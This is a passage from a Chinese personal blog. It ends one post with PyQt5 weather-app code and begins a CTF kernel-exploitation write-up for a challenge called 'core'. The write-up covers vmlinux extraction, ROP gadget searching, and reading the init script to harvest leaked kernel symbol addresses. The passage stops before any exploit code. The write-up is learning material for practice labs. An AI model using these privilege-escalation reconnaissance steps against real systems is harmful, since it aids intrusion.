class="string">&#x27;* clearResult &#x27;</span>)</span><br><span class="line">        self.ui.resultText.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        result = <span class="string">&quot;由于本项目不完善,请右键桌宠进行关闭&quot;</span></span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UI_Form</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        Form.setObjectName(<span class="string">&quot;Form&quot;</span>)</span><br><span class="line">        Form.resize(<span class="number">450</span>,<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(Form)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">431</span>,<span class="number">251</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.weatherComboBox = QtWidgets.QComboBox(self.groupBox)</span><br><span class="line">        self.weatherComboBox.setGeometry(QtCore.QRect(<span class="number">80</span>,<span class="number">30</span>,<span class="number">221</span>,<span class="number">21</span>))</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">60</span>,<span class="number">411</span>,<span class="number">181</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">72</span>,<span class="number">21</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.okButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.okButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.okButton.setObjectName(<span class="string">&quot;okButton&quot;</span>)</span><br><span class="line">        self.clearButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.clearButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.clearButton.setObjectName(<span class="string">&quot;clearButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI(Form)</span><br><span class="line">        self.okButton.clicked.connect(Form.queryWeather)</span><br><span class="line">        self.clearButton.clicked.connect(Form.clearResult)</span><br><span class="line">        self.quitButton.clicked.connect(Form.quitWindows)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#QtCore.QMetaObject.connectSlotsByName(Form)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        _translate = QtCore.QCoreApplication.translate</span><br><span class="line">        Form.setWindowTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;天气预报&quot;</span>))</span><br><span class="line"></span><br><span class="line">        self.groupBox.setTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询城市天气&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">0</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;成都&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">1</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;南充&quot;</span>))</span><br><span class="line">        self.label.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;城市&quot;</span>))</span><br><span class="line">        self.okButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询&quot;</span>))</span><br><span class="line">        self.clearButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;清空&quot;</span>))</span><br><span class="line">        self.quitButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;退出&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    win = Mainweather()</span><br><span class="line">    win.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.0</p>
</li>
<li><p>date：2022.5.12</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>第一代版本，后续考虑添加更换壁纸的功能</li>
</ul>
</li>
</ul>
<h2 id="CallWeatherWin-V1-1"><a href="#CallWeatherWin-V1-1" class="headerlink" title="CallWeatherWin_V1.1"></a>CallWeatherWin_V1.1</h2><p>第二代版本主要是进行了美化操作，功能没有太大改变</p>
<img src="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/1652443286512.png" class width="1652443286512"> 
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mainweather</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Mainweather, self).__init__(parent)</span><br><span class="line">        self.setWindowFlags(Qt.SubWindow)</span><br><span class="line">        self.ui = UI_Form()</span><br><span class="line">        self.ui.setupUI(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">queryWeather</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* queryWeather &#x27;</span>)</span><br><span class="line">        cityName = self.ui.weatherComboBox.currentText()</span><br><span class="line">        cityCode = self.transCityName(cityName)</span><br><span class="line"></span><br><span class="line">        rep = requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/&#x27;</span>+cityCode+<span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line">        rep.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(rep.json())</span><br><span class="line"></span><br><span class="line">        msg1 = (<span class="string">&#x27;城市: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg2 = (<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg3 = (<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>] + <span class="string">&quot; 度&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg4 = (<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg5 = (<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">        result = msg1+msg2+msg3+msg4+msg5</span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transCityName</span>(<span class="params">self,cityName</span>):</span></span><br><span class="line">        cityCode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> cityName == <span class="string">&#x27;成都&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270101&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> cityName == <span class="string">&#x27;南充&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270501&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> cityCode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clearResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* clearResult &#x27;</span>)</span><br><span class="line">        self.ui.resultText.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UI_Form</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        Form.setObjectName(<span class="string">&quot;Form&quot;</span>)</span><br><span class="line">        Form.resize(<span class="number">450</span>,<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(Form)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">250</span>,<span class="number">250</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.groupBox.setStyleSheet(<span class="string">&quot;color:white&quot;</span>)</span><br><span class="line">        self.weatherComboBox = QtWidgets.QComboBox(self.groupBox)</span><br><span class="line">        self.weatherComboBox.setGeometry(QtCore.QRect(<span class="number">80</span>,<span class="number">30</span>,<span class="number">140</span>,<span class="number">21</span>))</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">60</span>,<span class="number">220</span>,<span class="number">181</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.resultText.setFont(QFont(<span class="string">&quot;微软雅黑&quot;</span>,<span class="number">12</span>,QFont.Bold))</span><br><span class="line">        self.resultText.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">72</span>,<span class="number">21</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.okButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.okButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.okButton.setObjectName(<span class="string">&quot;okButton&quot;</span>)</span><br><span class="line">        self.clearButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.clearButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.clearButton.setObjectName(<span class="string">&quot;clearButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI(Form)</span><br><span class="line">        self.okButton.clicked.connect(Form.queryWeather)</span><br><span class="line">        self.clearButton.clicked.connect(Form.clearResult)</span><br><span class="line">        self.quitButton.clicked.connect(Form.quitWindows)</span><br><span class="line"></span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(Form)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        _translate = QtCore.QCoreApplication.translate</span><br><span class="line">        Form.setWindowTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;天气预报&quot;</span>))</span><br><span class="line">        self.groupBox.setTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询城市天气&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">0</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;成都&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">1</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;南充&quot;</span>))</span><br><span class="line">        self.label.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;城市&quot;</span>))</span><br><span class="line">        self.okButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询&quot;</span>))</span><br><span class="line">        self.clearButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;清空&quot;</span>))</span><br><span class="line">        self.quitButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;退出&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    win = Mainweather()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    win.setPalette(palette)</span><br><span class="line">    win.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.1</p>
</li>
<li><p>date：2022.5.13</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：<ul>
<li>导入了图片背景</li>
<li>修改了字体和颜色</li>
</ul>
</li>
<li>Changed：<ul>
<li>对部分代码进行了调整，使其更易读</li>
</ul>
</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>目前该项目以完善，在很长一段时间里可能都不会再碰该项目</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/12/my%20first%20kernel%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/my%20first%20kernel%20pwn/" class="post-title-link" itemprop="url">my first kernel pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-12 19:24:17" itemprop="dateCreated datePublished" datetime="2022-05-12T19:24:17+08:00">2022-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 23:13:02" itemprop="dateModified" datetime="2022-06-04T23:13:02+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>core  复现</strong></p>
<p>文件如下：</p>
<ul>
<li>bzImage：压缩的内核映像 </li>
<li>core.cpio：文件系统映像 </li>
<li>start.sh：用于启动 kernel 的 shell 的脚本 </li>
<li>vmlinux：静态链接的可执行文件格式的 Linux 内核</li>
</ul>
<p>如果没有 vmlinux，就需要使用 extract-vmlinux 进行提取，不过我更喜欢用 vmlinux-to-elf：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vmlinux-to-elf [core.cpio] [vmlinux] */</span></span><br><span class="line">➜  give_to_player vmlinux-to-elf core.cpio vmlinux </span><br><span class="line">[+] Kernel successfully decompressed in-memory (the offsets that follow will be given relative to the decompressed binary)</span><br><span class="line">[+] Version <span class="built_in">string</span>: Linux version <span class="number">4.15</span><span class="number">.8</span> (simple@vps-simple) (gcc version <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-16</span>) (GCC)) #<span class="number">20</span> SMP Fri Mar <span class="number">23</span> <span class="number">21</span>:<span class="number">12</span>:<span class="number">32</span> CST <span class="number">2018</span></span><br><span class="line">[+] Guessed architecture: x86_64 successfully in <span class="number">4.66</span> seconds</span><br><span class="line">[+] Found kallsyms_token_table at file offset <span class="number">0x016b5320</span></span><br><span class="line">[+] Found kallsyms_token_index at file offset <span class="number">0x016b5660</span></span><br><span class="line">[+] Found kallsyms_markers at file offset <span class="number">0x016b4de0</span></span><br><span class="line">[+] Found kallsyms_names at file offset <span class="number">0x01635568</span></span><br><span class="line">[+] Found kallsyms_num_syms at file offset <span class="number">0x01635560</span></span><br><span class="line">[i] Negative offsets overall: <span class="number">99.9953</span> %</span><br><span class="line">[i] Null addresses overall: <span class="number">0.0046729</span> %</span><br><span class="line">[+] Found kallsyms_offsets at file offset <span class="number">0x0160b898</span></span><br><span class="line">[+] Successfully wrote the <span class="keyword">new</span> ELF kernel to vmlinux</span><br></pre></td></tr></table></figure>
<ul>
<li>提取出来的 vmlinux 文件没有原版的好用</li>
<li>但是在搜索 gadget 时，尽量使用提取出来的 vmlinux，防止两个 vmlinux 不一样</li>
</ul>
<p>然后使用 Ropper 来寻找 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player time ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1  <span class="number">77.22</span>s user <span class="number">27.66</span>s system <span class="number">118</span>% cpu <span class="number">1</span>:<span class="number">28.72</span> total</span><br></pre></td></tr></table></figure>
<p>看一下启动脚本 start.sh：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player cat start.sh         </span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m <span class="number">64</span>M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<ul>
<li>内核开启了 kaslr 保护</li>
</ul>
<p>尝试启动时我遇见了问题：</p>
<img src="/2022/05/12/my%20first%20kernel%20pwn/1652256707606.png" class width="1652256707606"> 
<ul>
<li>按照 wiki 上的提示，把 start.sh 中的 64M 改为 128M，但是还是无效</li>
<li>于是我改为 256M，成功了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.023472</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ ls</span><br><span class="line">bin          etc          lib          proc         sys          vmlinux</span><br></pre></td></tr></table></figure>
<p>解压 core.cpio：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  core gunzip ./core.cpio.gz </span><br><span class="line">➜  core cpio -idm &lt; ./core.cpio</span><br><span class="line">➜  core ls</span><br><span class="line">bin      etc          init  lib64    proc  sbin  tmp  vmlinux</span><br><span class="line">core.ko  gen_cpio.sh  lib   linuxrc  root  sys   usr</span><br></pre></td></tr></table></figure>
<ul>
<li>发现除了常规的文件目录外，还有个 gen_cpio.sh </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  core cat gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip <span class="number">-9</span> &gt; $<span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这是一个打包的脚本（shell脚本有点看不懂，还要多多学习）</li>
</ul>
<p>看一下 core.cpio-&gt;init：（获取重要信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  core cat init               </span><br><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=<span class="number">4</span>,mode=<span class="number">620</span> none /dev/pts</span><br><span class="line">chmod <span class="number">666</span> /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms <span class="comment">// 把kallsyms的内容保存到了/tmp/kallsyms中,那么我们就能从/tmp/kallsyms中读取commit_creds,prepare_kernel_cred的函数的地址了</span></span><br><span class="line">echo <span class="number">1</span> &gt; /proc/sys/kernel/kptr_restrict <span class="comment">// 把kptr_restrict设为&#x27;1&#x27;,这样就不能通过/proc/kallsyms查看函数地址了(但上一行已经把其中的信息保存到了一个可读的文件中,这句就无关紧要了)</span></span><br><span class="line">echo <span class="number">1</span> &gt; /proc/sys/kernel/dmesg_restrict <span class="comment">// 把dmesg_restrict设为&#x27;1&#x27;,这样就不能通过dmesg查看kernel的信息了</span></span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">route add <span class="keyword">default</span> gw <span class="number">10.0</span><span class="number">.2</span><span class="number">.2</span> </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d <span class="number">120</span> -f &amp; <span class="comment">// 设置定时关机,为了避免做题时产生干扰,直接把这句删掉然后重新打包</span></span><br><span class="line">setsid /bin/cttyhack setuidgid <span class="number">1000</span> /bin/sh</span><br><span class="line">echo <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d <span class="number">0</span>  -f</span><br></pre></td></tr></table></figure>
<ul>
